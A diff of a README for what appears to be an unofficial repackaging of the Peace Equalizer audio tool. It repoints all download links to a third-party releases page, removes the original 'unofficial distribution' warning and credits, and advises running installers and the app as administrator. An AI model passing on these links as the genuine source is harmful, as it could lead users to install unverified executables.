@@ -1,72 +1,68 @@
-<div align="center">
- 
-<img width="917" height="470" alt="image" src="https://github.com/user-attachments/assets/efa4d911-0d17-45d0-948c-577c9ab0c7d4" />
+# 🎧 peace-equalizer-APO - Improve your computer audio sound quality
 
-# Peace Equalizer APO
-  <p align="center">
-    <strong>The Best GUI for Equalizer APO • Professional Audio Equalizer</strong>
-    <br/>
-  Parametric EqualizerAPO Windows Download•  Bass Boost • Gaming • Spotify • Headphones • Realtek • 
-    <br/>
-    <a href="https://github.com/Boob025/peace-equalizer-APO/issues">Report Bug</a> | <a href="https://github.com/Boob025/peace-equalizer-APO/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Audio-Peace%20Equalizer-1DB954?style=for-the-badge&logo=spotify" alt="Peace" />
-    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/Boob025/peace-equalizer-APO?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/Boob025/peace-equalizer-APO?style=flat-square" alt="License" />
-  </p>
-</div>
----
+[![](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases)
 
-## Download
- [Download `Peace-Equalizer.zip`](https://github.com/Boob025/peace-equalizer-APO/releases/download/Equalizer/Peace-Equalizer.zip)
- ---
-## Overview
-**Peace Equalizer APO** is a powerful and user-friendly graphical interface for **Equalizer APO** — the best system-wide audio equalizer for Windows.
+## 📁 What is this app
+Peace Equalizer is a graphical interface for the Equalizer APO audio processing tool. It allows you to adjust the sound output of your computer. You can change frequencies, boost bass, or clear up audio for your headphones and speakers. This tool works with Windows 11 and older versions. It supports presets for gaming, music, and movies. You can save your configurations and switch between them at any time.
 
-Enjoy studio-grade sound customization: bass boost, virtual surround, gaming presets, Spotify optimization, headphone correction, and much more.
+## ⚙️ System Requirements
+*   Windows 10 or Windows 11
+*   Equalizer APO installed
+*   Working audio drivers (Realtek or similar)
+*   10 MB of free storage space
 
-> [!Important]
-> Requires **Equalizer APO** to be installed first.
+## 🚀 How to set up your interface
+You must install Equalizer APO before you use the Peace interface. Follow these steps to get your system ready.
 
-## Key Features
-- Beautiful modern GUI with real-time frequency graph
-- Parametric EQ + Graphic EQ (31-band)
-- Preamp and advanced filter controls
-- Built-in AutoEQ support for 1000+ headphones
-- Bass Boost, Loudness, Virtual Surround
-- Gaming, Music, Movie, Voice presets
-- Per-device and per-application profiles
-- Low CPU usage
-- Full system-wide effect (works with Spotify, Discord, YouTube, Games, etc.)
+1.  Visit [this page](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases) to download the installation files.
+2.  Run the Equalizer APO installer file.
+3.  Choose your output device from the list provided during the installation.
+4.  Restart your computer to apply the audio changes.
+5.  Run the Peace Equalizer installer file.
+6.  Open the application to start adjusting your sound settings.
 
-## Installation Guide
-1. Install **Equalizer APO** (official version)
-2. Install **Peace Equalizer**
-3. Restart your PC
-4. Launch Peace and configure your sound
+## 🛠️ Using the equalizer
+The main screen shows a series of sliders. Each slider matches a specific sound frequency. Move a slider up to increase the volume of that frequency range. Move it down to decrease it.
 
-## Recommended For
-- Headphone users (best sound quality)
-- Bass lovers
-- Gamers
-- Music producers & audiophiles
-- Realtek onboard audio users
+*   **Frequency bars:** The sliders on the left control low bass. The sliders on the right control high treble.
+*   **Presets:** Use the preset menu to choose settings tailored for specific needs. Select a profile for speech, movies, or music. 
+*   **Saving configurations:** Click the save icon to store your current slider positions. You can load these later by choosing the file from the menu.
+*   **Gain control:** Use the preamp slider on the right side to adjust the total volume without changing individual frequencies. Avoid pushing this slider too high to prevent sound distortion.
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial** repository / distribution.  
-> Peace Equalizer is originally developed by the community on SourceForge.  
-> Always download the official version from trusted sources when possible.
+## 📂 Managing profiles
+You can keep different profiles for different hardware. Create one profile for your studio headphones and another for your desktop speakers. 
 
-## Contributing
-Feel free to contribute presets, themes, or improvements!
+*   Open the configuration window.
+*   Rename your current setup.
+*   Select the device from the dropdown menu.
+*   Click update to save the link between your device and the profile.
 
-## Acknowledgements
-- Original **Equalizer APO** developers
-- **Peace GUI** creator (peverbeek)
-- AutoEQ project for headphone profiles
+## 🔊 Enhancing your audio
+The software includes features to refine your experience. 
 
----
+### Bass boost
+If you want more impact from your movies or games, increase the sliders at the far left side. Do this in small increments to find the balance that suits your hardware. 
+
+### Graphic EQ vs Parametric EQ
+The graphical interface provides a visual layout of your sounds. You see the curves change as you move the sliders. If you prefer manual control, input the specific frequency values into the fields provided.
+
+### AutoEQ
+The app integrates with sound databases to apply corrections for specific headphone models. This ensures your hardware hits a neutral sound target. Select your headphone model from the import list to apply these professional settings automatically.
+
+## 🧐 Troubleshooting
+Follow these steps if you experience issues with sound quality or app performance.
+
+*   **No sound:** Check that Equalizer APO is installed. Open the configuration editor for Equalizer APO and confirm the checkmark for your device is active.
+*   **Distortion:** Reduce the preamp level on the right side of the Peace window. High boost values create digital clipping.
+*   **App won't open:** Right-click the shortcut and select run as administrator.
+*   **Windows updates:** If a major Windows update occurs, you might need to re-install Equalizer APO to ensure the audio filters load correctly.
+
+## 📑 Common settings
+Many users start with a V-shaped curve. This means the low and high frequencies are raised slightly, while the middle frequencies are kept low. This makes music sound bright and energetic. For voices, keep the middle sliders higher to gain clarity while watching videos or calls.
+
+## 💡 Support
+The community maintains the data used for the equalizer profiles. You can search for your specific headphone model online to find custom profiles shared by other users. Download these files and use the import button in the application settings to add them to your library. 
+
+Regular updates ensure the software stays compatible with the latest Windows versions. Check the download link below regularly for new versions that include interface improvements.
+
+[Download the latest version here](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases)
